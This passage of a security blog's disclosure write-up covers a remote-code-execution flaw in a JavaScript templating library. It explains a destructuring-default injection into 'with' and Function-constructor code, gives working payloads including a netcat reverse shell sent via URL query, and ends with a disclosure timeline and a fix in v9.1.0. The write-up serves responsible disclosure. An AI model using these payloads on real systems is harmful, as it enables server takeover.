<span data-line=""><span style="color:#CDD6F4">[a</span><span style="color:#9399B2">,</span><span style="color:#9399B2"> ,</span><span style="color:#CDD6F4"> b</span><span style="color:#9399B2">,</span><span style="color:#94E2D5"> ...</span><span style="color:#CDD6F4">rest] </span><span style="color:#94E2D5">=</span><span style="color:#CDD6F4"> array</span><span style="color:#9399B2">;</span></span>
<span data-line=""><span style="color:#CDD6F4">[a</span><span style="color:#9399B2">,</span><span style="color:#CDD6F4"> b</span><span style="color:#9399B2">,</span><span style="color:#94E2D5"> ...</span><span style="color:#9399B2">{</span><span style="color:#CDD6F4"> pop</span><span style="color:#9399B2">,</span><span style="color:#CDD6F4"> push </span><span style="color:#9399B2">}</span><span style="color:#CDD6F4">] </span><span style="color:#94E2D5">=</span><span style="color:#CDD6F4"> array</span><span style="color:#9399B2">;</span></span>
<span data-line=""><span style="color:#CDD6F4">[a</span><span style="color:#9399B2">,</span><span style="color:#CDD6F4"> b</span><span style="color:#9399B2">,</span><span style="color:#94E2D5"> ...</span><span style="color:#CDD6F4">[c</span><span style="color:#9399B2">,</span><span style="color:#CDD6F4"> d]] </span><span style="color:#94E2D5">=</span><span style="color:#CDD6F4"> array</span><span style="color:#9399B2">;</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color:#CDD6F4">(</span><span style="color:#9399B2">{</span><span style="color:#CDD6F4"> a</span><span style="color:#9399B2">,</span><span style="color:#CDD6F4"> b </span><span style="color:#9399B2">}</span><span style="color:#94E2D5"> =</span><span style="color:#CDD6F4"> obj)</span><span style="color:#9399B2">;</span><span style="color:#6C7086;font-style:italic"> // parentheses are required</span></span>
<span data-line=""><span style="color:#CDD6F4">(</span><span style="color:#9399B2">{</span><span style="color:#CDD6F4"> a</span><span style="color:#94E2D5">:</span><span style="color:#CDD6F4"> a1</span><span style="color:#9399B2">,</span><span style="color:#CDD6F4"> b</span><span style="color:#94E2D5">:</span><span style="color:#CDD6F4"> b1 </span><span style="color:#9399B2">}</span><span style="color:#94E2D5"> =</span><span style="color:#CDD6F4"> obj)</span><span style="color:#9399B2">;</span></span>
<span data-line=""><span style="color:#CDD6F4">(</span><span style="color:#9399B2">{</span><span style="color:#CDD6F4"> a</span><span style="color:#94E2D5">:</span><span style="color:#CDD6F4"> a1 </span><span style="color:#94E2D5">=</span><span style="color:#CDD6F4"> aDefault</span><span style="color:#9399B2">,</span><span style="color:#CDD6F4"> b </span><span style="color:#94E2D5">=</span><span style="color:#CDD6F4"> bDefault </span><span style="color:#9399B2">}</span><span style="color:#94E2D5"> =</span><span style="color:#CDD6F4"> obj)</span><span style="color:#9399B2">;</span></span>
<span data-line=""><span style="color:#CDD6F4">(</span><span style="color:#9399B2">{</span><span style="color:#CDD6F4"> a</span><span style="color:#9399B2">,</span><span style="color:#CDD6F4"> b</span><span style="color:#9399B2">,</span><span style="color:#94E2D5"> ...</span><span style="color:#CDD6F4">rest </span><span style="color:#9399B2">}</span><span style="color:#94E2D5"> =</span><span style="color:#CDD6F4"> obj)</span><span style="color:#9399B2">;</span></span>
<span data-line=""><span style="color:#CDD6F4">(</span><span style="color:#9399B2">{</span><span style="color:#CDD6F4"> a</span><span style="color:#94E2D5">:</span><span style="color:#CDD6F4"> a1</span><span style="color:#9399B2">,</span><span style="color:#CDD6F4"> b</span><span style="color:#94E2D5">:</span><span style="color:#CDD6F4"> b1</span><span style="color:#9399B2">,</span><span style="color:#94E2D5"> ...</span><span style="color:#CDD6F4">rest </span><span style="color:#9399B2">}</span><span style="color:#94E2D5"> =</span><span style="color:#CDD6F4"> obj)</span><span style="color:#9399B2">;</span></span></code></pre></figure><p>The most interesting syntax is this:</p><figure data-rehype-pretty-code-figure=""><pre style="background-color:#1e1e2e;color:#cdd6f4" tabindex="0" data-language="javascript" data-theme="catppuccin-mocha"><code data-language="javascript" data-theme="catppuccin-mocha" style="display: grid;"><span data-line=""><span style="color:#CDD6F4">(</span><span style="color:#9399B2">{</span><span style="color:#CDD6F4"> a</span><span style="color:#94E2D5">:</span><span style="color:#CDD6F4"> a1 </span><span style="color:#94E2D5">=</span><span style="color:#CDD6F4"> aDefault</span><span style="color:#9399B2">,</span><span style="color:#CDD6F4"> b </span><span style="color:#94E2D5">=</span><span style="color:#CDD6F4"> bDefault </span><span style="color:#9399B2">}</span><span style="color:#94E2D5"> =</span><span style="color:#CDD6F4"> obj)</span><span style="color:#9399B2">;</span></span></code></pre></figure><p>It takes the value corresponding to the <span data-rehype-pretty-code-figure=""><code data-language="plaintext" data-theme="catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4"><span data-line=""><span>a1</span></span></code></span> key in <span data-rehype-pretty-code-figure=""><code data-language="plaintext" data-theme="catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4"><span data-line=""><span>obj</span></span></code></span>, and assigns it to <span data-rehype-pretty-code-figure=""><code data-language="plaintext" data-theme="catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4"><span data-line=""><span>a</span></span></code></span>. If <span data-rehype-pretty-code-figure=""><code data-language="plaintext" data-theme="catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4"><span data-line=""><span>a1</span></span></code></span> is not defined then it
evaluates <span data-rehype-pretty-code-figure=""><code data-language="plaintext" data-theme="catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4"><span data-line=""><span>aDefault</span></span></code></span></p><p>With this syntax, we can satisfy the <span data-rehype-pretty-code-figure=""><code data-language="plaintext" data-theme="catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4"><span data-line=""><span>with</span></span></code></span> expression since it’s now a valid object initializer. It also satisfies the
<span data-rehype-pretty-code-figure=""><code data-language="plaintext" data-theme="catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4"><span data-line=""><span>Function</span></span></code></span> constructor since it’s simply assigning the value to a different name. So we can use this for RCE!</p><figure data-rehype-pretty-code-figure=""><pre style="background-color:#1e1e2e;color:#cdd6f4" tabindex="0" data-language="javascript" data-theme="catppuccin-mocha"><code data-language="javascript" data-theme="catppuccin-mocha" style="display: grid;"><span data-line=""><span style="color:#6C7086;font-style:italic">// valid!</span></span>
<span data-line=""><span style="color:#CBA6F7">with</span><span style="color:#CDD6F4"> (</span><span style="color:#9399B2">{</span><span style="color:#CDD6F4"> a</span><span style="color:#94E2D5">:</span><span style="color:#CDD6F4"> b </span><span style="color:#94E2D5">=</span><span style="color:#CDD6F4"> console</span><span style="color:#94E2D5">.</span><span style="color:#89B4FA;font-style:italic">log</span><span style="color:#CDD6F4">(</span><span style="color:#A6E3A1">"x"</span><span style="color:#CDD6F4">) </span><span style="color:#9399B2">}</span><span style="color:#94E2D5"> ||</span><span style="color:#9399B2"> {}</span><span style="color:#CDD6F4">) </span><span style="color:#9399B2">{</span></span>
<span data-line=""><span style="color:#6C7086;font-style:italic">    // ...</span></span>
<span data-line=""><span style="color:#9399B2">}</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color:#6C7086;font-style:italic">// valid!</span></span>
<span data-line=""><span style="color:#CBA6F7;font-weight:bold">new</span><span style="color:#89B4FA;font-style:italic"> Function</span><span style="color:#CDD6F4">(</span><span style="color:#A6E3A1">"{ a: b = console.log('x') }"</span><span style="color:#9399B2">,</span><span style="color:#A6E3A1"> "c"</span><span style="color:#9399B2">,</span><span style="color:#A6E3A1"> "cb"</span><span style="color:#9399B2">,</span><span style="color:#A6E3A1"> "return 1"</span><span style="color:#CDD6F4">)</span></span></code></pre></figure><p>Let’s test out our payload with a reverse shell:</p><figure data-rehype-pretty-code-figure=""><pre style="background-color:#1e1e2e;color:#cdd6f4" tabindex="0" data-language="plaintext" data-theme="catppuccin-mocha"><code data-language="plaintext" data-theme="catppuccin-mocha" style="display: grid;"><span data-line=""><span>Payload: { a: b = global.process.mainModule.require("child_process").execSync("nc -e /bin/sh localhost 1337") }</span></span>
<span data-line=""> </span>
<span data-line=""><span>http://localhost:3000?useWith=1&#x26;varName=%7B%20a:%20b%20=%20global.process.mainModule.require(%22child_process%22).execSync(%22nc%20-e%20/bin/sh%20localhost%201337%22)%20%7D</span></span></code></pre></figure><p>And we have RCE!</p><p><img  src="/_astro/reverse-shell.CgYCXD0F_17mfRh.webp" alt="Reverse shell" width="1022" height="326" loading="lazy" decoding="async"></p></section><section><h2 id="better-payloads">Better payloads</h2><p>In the process of writing the report, I realized that there are easier payloads that can be used:</p><figure data-rehype-pretty-code-figure=""><pre style="background-color:#1e1e2e;color:#cdd6f4" tabindex="0" data-language="javascript" data-theme="catppuccin-mocha"><code data-language="javascript" data-theme="catppuccin-mocha" style="display: grid;"><span data-line=""><span style="color:#CDD6F4">[ a </span><span style="color:#94E2D5">=</span><span style="color:#CDD6F4"> console</span><span style="color:#94E2D5">.</span><span style="color:#89B4FA;font-style:italic">log</span><span style="color:#CDD6F4">(</span><span style="color:#A6E3A1">"x"</span><span style="color:#CDD6F4">) ]</span></span></code></pre></figure><p>This payload is valid in both the <span data-rehype-pretty-code-figure=""><code data-language="plaintext" data-theme="catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4"><span data-line=""><span>with</span></span></code></span> expression and the <span data-rehype-pretty-code-figure=""><code data-language="plaintext" data-theme="catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4"><span data-line=""><span>Function</span></span></code></span> constructor.</p><figure data-rehype-pretty-code-figure=""><pre style="background-color:#1e1e2e;color:#cdd6f4" tabindex="0" data-language="javascript" data-theme="catppuccin-mocha"><code data-language="javascript" data-theme="catppuccin-mocha" style="display: grid;"><span data-line=""><span style="color:#6C7086;font-style:italic">// don't set useWith=1</span></span>
<span data-line=""><span style="color:#9399B2">{</span><span style="color:#CDD6F4"> a </span><span style="color:#94E2D5">=</span><span style="color:#CDD6F4"> console</span><span style="color:#94E2D5">.</span><span style="color:#89B4FA;font-style:italic">log</span><span style="color:#CDD6F4">(</span><span style="color:#A6E3A1">"x"</span><span style="color:#CDD6F4">) </span><span style="color:#9399B2">}</span></span></code></pre></figure><p>With this payload, we can just bypass the <span data-rehype-pretty-code-figure=""><code data-language="plaintext" data-theme="catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4"><span data-line=""><span>with</span></span></code></span> expression entirely, and just inject the payload into the <span data-rehype-pretty-code-figure=""><code data-language="plaintext" data-theme="catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4"><span data-line=""><span>Function</span></span></code></span>
constructor.</p></section></section>
<section><h1 id="timeline">Timeline</h1><p>Note: When I first requested the CVE ID, I put my Gmail as the contact email, but didn’t receive any response. I’m
pretty sure that Gmail is blocking emails from <span data-rehype-pretty-code-figure=""><code data-language="plaintext" data-theme="catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4"><span data-line=""><span>mitre.org</span></span></code></span> which can’t be disabled, so I re-requested the CVE with
Outlook.</p><ul>
<li><em>First discovery</em>: 28 May 2024</li>
<li><em>Reported to maintainer Ben Gubler</em>: 28 May 2024</li>
<li><em>CVE ID requested</em>: 30 May 2024</li>
<li><em>CVE ID re-requested</em>: 1 Jul 2024</li>
<li><em>Fix merged</em>: 2 Jul 2024</li>
<li><em>CVE ID assigned</em>: 17 Jul 2024</li>
<li><em>Public disclosure</em>: 18 Jul 2024</li>
<li><em>CVE published</em>: 22 Aug 2024</li>
</ul><section><h2 id="remediation">Remediation</h2><p>The vulnerability has been patched in v9.1.0.</p></section></section> </div> <div class="flex justify-between mt-6 pt-6 border-t border-[--secondary-bg]"> <a class="p-3 border border-[--secondary-bg] rounded-lg" href="/posts/cve-2024-36361"> <i class="fa-regular fa-angle-left"></i> Pug v3.0.2 RCE (CVE-2024-36361) </a> <a class="p-3 border border-[--secondary-bg] rounded-lg" href="/posts/grey-finals-2024"> GreyCTF Finals 2024 <i class="fa-regular fa-angle-right"></i> </a> </div> <script src="https://giscus.app/client.js" data-repo="samuzora/blog" data-repo-id="R_kgDOIp6e0Q" data-category="Announcements" data-category-id="DIC_kwDOIp6e0c4CfplK" data-mapping="pathname" data-strict="0" data-reactions-enabled="1" data-emit-metadata="1" data-input-position="bottom" data-theme="noborder_dark" data-lang="en" data-loading="lazy" crossorigin="anonymous" async></script> <!--]--></div> </div> </div> </div>  </div> </div> <div class="footer absolute bottom-0 w-full mt-10 flex align-center justify-center" data-astro-cid-sckkx6r4> <div class="my-auto text-center text-[--second-text-color] text-lg font-[600]" data-astro-cid-sckkx6r4>
samuzora © 2021 - 2024
</div> </div> </div> </body></html> <script src="/assets/simple-scrollbar.js"></script>